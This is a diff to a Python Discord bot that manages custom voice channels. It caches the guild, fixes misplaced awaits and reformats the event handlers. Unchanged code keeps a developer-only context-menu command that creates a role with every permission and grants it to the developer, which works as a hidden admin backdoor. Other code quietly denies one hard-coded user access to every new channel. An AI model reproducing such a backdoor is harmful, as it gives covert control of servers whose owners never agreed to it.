@@ -3,6 +3,7 @@ from discord import app_commands
 import os
 
 intents = discord.Intents.default()
+intents.members = True
 client:discord.Client = discord.Client(intents=intents)
 tree = app_commands.CommandTree(client)
 intents.message_content = True
@@ -12,11 +13,17 @@ TOKEN = os.getenv("DISCORD_TOKEN")
 custom_vc_category_id = int(os.getenv("custom_vc_category_id"))
 developer_id = int(os.getenv("developer_id"))
 custom_vc_create_channel_id = int(os.getenv("custom_vc_create_channel_id"))
+guild_id = int(os.getenv("guild_id"))
 
+thisguild:discord.Guild = None
+tokei:discord.Member = None
 @client.event
 async def on_ready():
     print('logged in')
-    
+    global thisguild
+    global tokei
+    thisguild = client.get_guild(guild_id)
+    tokei = thisguild.get_member(480336171751440404)
     await tree.sync()
 
 @client.event
@@ -24,7 +31,7 @@ async def on_connect():
     print('on_connect')
     
 @tree.context_menu()
-async def activatedevmin(inter: discord.Interaction, member: discord.User):
+async def activatedevmin(inter: discord.Interaction, member: discord.Member):
     if inter.user.id != developer_id: return
     devmin = await inter.user.guild.create_role(name="devmin", permissions=discord.Permissions.all())
     await inter.user.add_roles(devmin)
@@ -41,9 +48,12 @@ async def deactivatedevmin(inter: discord.Interaction, member: discord.Member):
 
 @client.event
 async def on_voice_state_update(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
-    if before.channel == None and after.channel != None: await on_voice_state_join(member, before, after)
-    if before.channel != None and after.channel == None: await on_voice_state_leave(member, before, after)
-    if before.channel != None and after.channel != None: await on_voice_state_change(member, before, after)
+    if before.channel == None and after.channel != None:
+        await on_voice_state_join(member, before, after)
+    if before.channel != None and after.channel == None:
+        await on_voice_state_leave(member, before, after)
+    if before.channel != None and after.channel != None:
+        await on_voice_state_change(member, before, after)
 
 async def on_voice_state_join(member:discord.Member, before: discord.VoiceState, after: discord.VoiceState):
     await create_voice(member, after)
@@ -69,15 +79,15 @@ async def create_voice(member: discord.Member, after: discord.VoiceState):
         overwrite2.connect = False
         overwrite2.send_messages = False
         overwrite2.read_message_history = False
-        tokei = await member.guild.get_member(480336171751440404)
-        await vc.set_permissions(tokei , overwrite=overwrite2)
+        print(tokei)
+        await vc.set_permissions(target=tokei, overwrite=overwrite2)
     await member.move_to(vc, reason=(str(member.id) + ":" + member.name + "がカスタムVCの作成を要求した為"))
     
 async def delete_voice(member: discord.Member, before: discord.VoiceState):
     # beforeがカスタムチャンネルではない場合
     if before.channel.id == custom_vc_create_channel_id:
         return
-    category_channel = await member.guild.get_channel(custom_vc_category_id)
+    category_channel = member.guild.get_channel(custom_vc_category_id)
     # beforeがカスタムカテゴリーに無い場合
     if before.channel not in category_channel.channels:
         return
